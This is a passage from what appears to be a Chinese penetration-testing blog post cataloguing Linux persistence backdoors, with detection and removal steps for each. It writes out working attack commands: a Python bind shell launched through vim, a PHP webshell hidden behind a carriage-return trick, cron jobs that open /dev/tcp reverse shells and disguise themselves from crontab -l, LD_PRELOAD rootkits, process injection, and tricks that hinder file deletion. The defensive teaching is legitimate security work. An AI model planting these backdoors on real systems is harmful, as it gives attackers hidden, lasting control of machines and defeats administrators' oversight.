<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python2</span><br><span class="hljs-keyword">import</span> struct<br>buffer = struct.pack(<span class="hljs-string">&#x27;&gt;I6&#x27;</span>,<span class="hljs-number">19526</span>) <span class="hljs-comment"># 这里输出的LF就是前面命令中的值</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">repr</span>(buffer)<br>buffer = struct.pack(<span class="hljs-string">&#x27;&gt;I6&#x27;</span>,<span class="hljs-number">12345</span>) <span class="hljs-comment"># 这里输出的值可以用来替换，以自定义源端口</span><br><span class="hljs-built_in">print</span> buffer<br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux17.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">





<p><strong>(2) 检测：</strong> 该后门会修改&#x2F;usr&#x2F;sbin&#x2F;sshd文件，检查该文件是否被修改即可。</p>
<p><strong>(3) 清除：</strong> 复制相同ssh版本号的sshd文件进行替换即可。</p>
<h5 id="8-vim-python2-扩展后门-未复现"><a href="#8-vim-python2-扩展后门-未复现" class="headerlink" title="8.vim python2 扩展后门(未复现)"></a><del>8.vim python2 扩展后门(未复现)</del></h5><p><strong>(1) 原理：</strong></p>
<p>vim安装时默认安装了当前服务器的python版本的扩展，如果是python2那么就会有python2的扩展，利用该扩展，可以用vim执行python脚本。（如果是python3则无法利用此后门，未实测）</p>
<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux18.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /usr/lib/python2.7/site-packages &amp;&amp; $(<span class="hljs-built_in">nohup</span> vim -E -c <span class="hljs-string">&quot;pyfile dir.py&quot;</span> &gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; <span class="hljs-built_in">sleep</span> 2 &amp;&amp; <span class="hljs-built_in">rm</span> -f dir.py <span class="hljs-comment"># dir.py可以是任意的py文件</span><br></code></pre></td></tr></table></figure>

<p>此处，dir.py文件为一个反弹shell的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> os, threading, sys, time<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    server=socket(AF_INET,SOCK_STREAM)<br>    server.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,<span class="hljs-number">11</span>))<br>    server.listen(<span class="hljs-number">5</span>)<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;waiting for connect&#x27;</span><br>    talk, addr = server.accept()<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;connect from&#x27;</span>,addr<br>    proc = subprocess.Popen([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>], stdin=talk, stdout=talk, stderr=talk, shell=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>

<p><strong>(2) 检测：</strong> 该后门会有明显的进程信息：</p>
<pre><code class="hljs">ps -aux | grep vim
</code></pre>
<p>可以看到异常文件，若存在网络行为，也可以看到异常网络连接：</p>
<pre><code class="hljs">netstat -antp | grep vim
</code></pre>
<p><strong>(3) 清除：</strong> 杀死进程，删除文件即可。</p>
<h5 id="9-终端解析-r隐藏文本"><a href="#9-终端解析-r隐藏文本" class="headerlink" title="9.终端解析\r隐藏文本"></a>9.终端解析\r隐藏文本</h5><p><strong>(1) 原理：</strong></p>
<p>shell在解析\r时会忽略掉\r前的信息。</p>
<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux19.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>使用该特性可隐藏webshell代码：</p>
<pre><code class="hljs">echo -e &quot;&lt;?=\`\$_POST[pass]\`?&gt;\r&lt;?=&#39;PHP TEST PAGE&#39;;?&gt;&quot; &gt; /var/www/html/test.php
</code></pre>
<p><strong>(2) 检测：</strong> 此类型的后门虽然在shell下无法查看，但是通过编辑器、vim能够看到。</p>
<p><strong>(3) 清除：</strong> 删除恶意代码。</p>
<h5 id="10-计划任务"><a href="#10-计划任务" class="headerlink" title="10.计划任务"></a>10.计划任务</h5><p><strong>(1) 原理：</strong></p>
<p>写入计划任务，定期执行特定的命令。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># 目标机</span><br>crontab -l<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;*/1 * * * * exec 9&lt;&gt; /dev/tcp/127.0.0.1/8888;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile&quot;</span> | crontab - <span class="hljs-comment"># 该命令会修改/var/spool/cron/下对应用户的文件，如root用户执行该命令，则会修改该目录下的root文件，也相当于crontab -e</span><br>crontab -l<br><br><span class="hljs-comment"># 攻击机</span><br>nc -l 8888<br></code></pre></td></tr></table></figure>

<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux20.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p>还有许多其他可以执行计划任务的文件或相关文件：</p>
<table>
<thead>
<tr>
<th align="left">文件&#x2F;目录</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">&#x2F;etc&#x2F;cron.d&#x2F;</td>
<td align="left">存放用来设定除了每天&#x2F;每周&#x2F;每月之外的定时任务，比如说每小时周期执行的任务和其他任何定时任务</td>
</tr>
<tr>
<td align="left">&#x2F;etc&#x2F;cron.d&#x2F;0hourly</td>
<td align="left">系统每小时第一分钟需要执行的任务</td>
</tr>
<tr>
<td align="left">&#x2F;etc&#x2F;cron.deny</td>
<td align="left">用户拒绝列表（在该文件中的用户不能使用cron服务）</td>
</tr>
<tr>
<td align="left">&#x2F;etc&#x2F;crontab</td>
<td align="left">该文件的作用相当于&#x2F;etc&#x2F;cron.d&#x2F;下面的某一个文件，可以定义系统计划任务</td>
</tr>
<tr>
<td align="left">&#x2F;var&#x2F;spool&#x2F;cron</td>
<td align="left">以用户名命名的文本文件，存放各个用户自己设定的定时任务，普通用户没有权限直接访问，必须通过crontab命令</td>
</tr>
<tr>
<td align="left">&#x2F;etc&#x2F;cron.monthly&#x2F;</td>
<td align="left">存放系统每个月需要执行的脚本</td>
</tr>
<tr>
<td align="left">&#x2F;etc&#x2F;cron.weekly&#x2F;</td>
<td align="left">存放系统每周需要执行的脚本</td>
</tr>
<tr>
<td align="left">&#x2F;etc&#x2F;cron.daily&#x2F;</td>
<td align="left">存放系统每天需要执行的脚本</td>
</tr>
<tr>
<td align="left">&#x2F;etc&#x2F;cron.hourly&#x2F;</td>
<td align="left">存放系统每小时需要执行的脚本</td>
</tr>
</tbody></table>
<p>crontab -l命令实际上就是在读取&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;（CentOS：&#x2F;var&#x2F;spool&#x2F;crontab&#x2F;）目录下对应用户名的文件内容。如果用户从未通过crontab命令设置过计划任务，那么这个文件是不存在的，此时，执行crontab -l会返回no crontab for root。</p>
<p>这里有个技巧，就是在计划任务要执行的命令中插入不可打印字符，使得crontab -l命令显示我们知道的字符串：</p>
<pre><code class="hljs">(printf &quot;*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;) | crontab -
</code></pre>
<img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux21.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">

<p><strong>(2) 检测：</strong> 查看各个计划任务文件的内容是否有异常，或使用crontab -l命令列出当前用户的自定义计划任务。</p>
<p><strong>(3) 清除：</strong> 删除异常计划任务即可。</p>
<h5 id="11-预加载动态链接库"><a href="#11-预加载动态链接库" class="headerlink" title="11.预加载动态链接库"></a>11.预加载动态链接库</h5><p><strong>(1) 原理：</strong></p>
<p>系统在执行一些命令的时候，在真正执行其文件之前，会加载相应的动态链接库。linux提供了一个可以加载自定义动态链接库的方式，并且比加载正常动态链接库更早。可以利用该特性设置自定义加载恶意动态链接库。</p>
<p>第一种：</p>
<pre><code class="hljs">export LD_PRELOAD=/usr/lib/cub3.so.1 # https://github.com/mempodippy/cub3
</code></pre>
<p>cub3.so.1是一个可以隐藏自己的动态链接库，当设置了预加载动态链接库时，在执行命令的时候即可隐藏自己。</p>
<p>第二种：Vegile后门</p>
<p>条件：必须要有base32命令</p>
<pre><code class="hljs">git clone https://github.com/Screetsec/Vegile.git
cd Vegile
chmod +x Vegile
./Vegile --u malware # malware为msf的上线elf文件
</code></pre>
<p>这个后门会生成多个恶意文件和进程：</p>
<p>&#x2F;usr&#x2F;bin&#x2F;screetsec<br>&#x2F;usr&#x2F;bin&#x2F;debug<br>&#x2F;usr&#x2F;bin&#x2F;tracker<br>&#x2F;usr&#x2F;bin&#x2F;supervisited<br>&#x2F;usr&#x2F;bin&#x2F;rma</p>
<p>这些恶意文件，msf监听器会收到反弹连接，断开之后还会继续反弹：</p>
<p>进程也无法完全杀死：</p>
<p><del>CentOS7测试失败，ubuntu18.04测试失败，ubuntu15.04测试成功（未实测）</del></p>
<p><strong>(2) 检测：</strong></p>
<p>第一种：查看LD_PRELOAD环境变量的值是否存在异常，对存在异常的文件进行分析。</p>
<p>第二种：查看&#x2F;etc&#x2F;ld.so.preload文件内容，对存在异常的文件进行分析。</p>
<p><strong>(3) 清除：</strong></p>
<p>第一种：取消LD_PRELOAD环境变量并删除对应文件。</p>
<p>第二种：删除&#x2F;etc&#x2F;ld.so.preload文件中的异常文件。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cat</span> /etc/ld.so.preload<br><span class="hljs-built_in">echo</span> &gt; /etc/ld.so.preload <span class="hljs-comment"># 取消so文件加载</span><br></code></pre></td></tr></table></figure>

<p>还要解决一个问题：把异常进程杀死</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">pstree -a -h -p <span class="hljs-comment"># 列出进程树，查看异常进程的父进程</span><br></code></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">rm</span> -f /usr/local/lib/libprocesshider.so <span class="hljs-comment"># 删除异常so文件</span><br></code></pre></td></tr></table></figure>

<p>发现该进程加载了恶意so文件。尝试kill 14753进程，然后再看：</p>
<p>发现是14753这个进程启动的异常进程，启动命令：sh -c &#x2F;usr&#x2F;lib&#x2F;at-spi2-core&#x2F;at-spi2-core-launcher</p>
<p>查看该父进程加载的so文件：</p>
<p>pmap -p -q 14753</p>
<p>发现异常进程再次启动，并且后门正常外联：</p>
<p>说明，子进程对父进程有进程保护，父进程调用子进程</p>
<p>删除父进程文件并挂起（kill -STOP）父进程，再杀死所有子进程，最后杀死父进程：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">kill</span> -STOP 14574 <span class="hljs-comment"># 挂起父进程</span><br><span class="hljs-built_in">kill</span> -9 14971 <span class="hljs-comment"># 杀死子进程</span><br><span class="hljs-built_in">kill</span> -9 14975 <span class="hljs-comment"># 杀死子进程</span><br><span class="hljs-built_in">kill</span> -9 15092 <span class="hljs-comment"># 杀死子进程</span><br><span class="hljs-built_in">kill</span> -9 15101 <span class="hljs-comment"># 杀死子进程</span><br><span class="hljs-built_in">kill</span> -9 16089 <span class="hljs-comment"># 杀死子进程</span><br><span class="hljs-built_in">kill</span> -9 14574 <span class="hljs-comment"># 杀死父进程</span><br></code></pre></td></tr></table></figure>

<p>此时，所有恶意进程被杀死：</p>
<p>处理完成。</p>
<h5 id="12-进程注入"><a href="#12-进程注入" class="headerlink" title="12.进程注入"></a>12.进程注入</h5><p><strong>(1) 原理：</strong></p>
<p>将恶意的动态链接库注入到其他进程当中执行，因此较为隐蔽。</p>
<p>在linux的多个发行版本中，内核的默认配置文件&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;yama&#x2F;ptrace_scope设置为1，意思是限制进程除了fork()派生外，无法通过ptrace()来操作另外一个进程。如果要进行进程注入，则需要修改该值为0。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> 0 &gt; /proc/sys/kernel/yama/ptrace_scope <span class="hljs-comment"># 需要root权限</span><br></code></pre></td></tr></table></figure>

<p>注入工具：<a target="_blank" rel="noopener" href="https://github.com/gaffe23/linux-inject/">https://github.com/gaffe23/linux-inject/</a></p>
<p>CentOS7:</p>
<p>我们要注入的so文件源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><br></code></pre></td></tr></table></figure>

<p>将上述代码编译为so文件：</p>
<pre><code class="hljs">clang -std=gnu99 -ggdb -D_GNU_SOURCE -shared -o back.so -lpthread -fPID back.c
</code></pre>
<p>尝试注入系统进程失败，找一个非系统进程注入：</p>
<p>注入之后，收到反弹shell。</p>
<p>但是这个进程注入工具在注入到目标进程后，会把目标进程给替换掉，也就是把源进程给干掉，pid不变，cmdline这些都变了，其实是一个不完美的工具。</p>
<p>Ubuntu18.04：</p>
<p>显示失败，实际上是成功的。</p>
<p><strong>(2) 检测：</strong> 该工具会有明显的进程名，检查进程名即可。</p>
<p><strong>(3) 清除：</strong> 杀死恶意进程。</p>
<h5 id="后门辅助技巧：创建文件名无法补全的文件"><a href="#后门辅助技巧：创建文件名无法补全的文件" class="headerlink" title="后门辅助技巧：创建文件名无法补全的文件"></a>后门辅助技巧：创建文件名无法补全的文件</h5><p><strong>(1) 原理：</strong></p>
<p>linux下每个目录默认存在.和..两个目录，且可用tab键补全。但如果文件名只包含.和空格则无法直接补全。可以利用.或..跟上多个空格来创建文件或文件夹，使管理员难以删除这个文件或文件夹。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> <span class="hljs-built_in">whoami</span> &gt; .\ \ \ \ <br><span class="hljs-built_in">mkdir</span> ..\ \ \ <br></code></pre></td></tr></table></figure>

<p>此时，用tab键无法补全。</p>
<p><strong>(2) 检测：</strong> 出现这种情况还是很容易识别异常的，因为本身就是异常。</p>
<p><strong>(3) 清除：</strong> 虽然tab键无法补全，但是通过原理可知，是因为后面添加了空格，所以在.或..后添加\加空格后即可补全：</p>
<p>也可以对该文件进行编辑和删除。</p>
<h5 id="后门辅助技巧：修改文件属性"><a href="#后门辅助技巧：修改文件属性" class="headerlink" title="后门辅助技巧：修改文件属性"></a>后门辅助技巧：修改文件属性</h5><p><strong>(1) 原理：</strong></p>
<p>任何文件都有文件属性，默认普通文件的文件属性都是空白，对文件添加不可修改属性之后，文件即无法被删除和修改内容。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">lsattr filename<br>chattr +i filename<br></code></pre></td></tr></table></figure>

<p><strong>(2) 检测：</strong> lsattr命令可以查看文件属性，带有i则为添加了不可修改属性，如果判断为恶意的文件无法删除的话，可以尝试修改文件属性。</p>
<p><strong>(3) 清除：</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">chattr -i filename<br></code></pre></td></tr></table></figure>

<h2 id="五、清理痕迹"><a href="#五、清理痕迹" class="headerlink" title="五、清理痕迹"></a>五、清理痕迹</h2><p>清理痕迹在上篇中已经写了很多了，后续有的话，会持续进行补充～</p>
<p>说好的补充一下，又写了这么多；学无止境啊～   </p>
<p>后续有新手法，新知识点。会直接同步到这篇文章中。</p>
<p>持续更新中……</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/" class="category-chain-item">内网渗透思路</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="print-no-link">#内网渗透</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>内网渗透总结2--补充</div>
      <div>http://aqiao-jashell.github.io/2025/07/04/内网渗透总结2-补充/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>CNAQ</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年7月4日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/04/15/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E3%80%8C%E4%B8%80%E3%80%8D-java-SE%E5%9F%BA%E7%A1%80/" title="Java代码审计基础知识「一」-- java SE基础">
                        <span class="hidden-mobile">Java代码审计基础知识「一」-- java SE基础</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
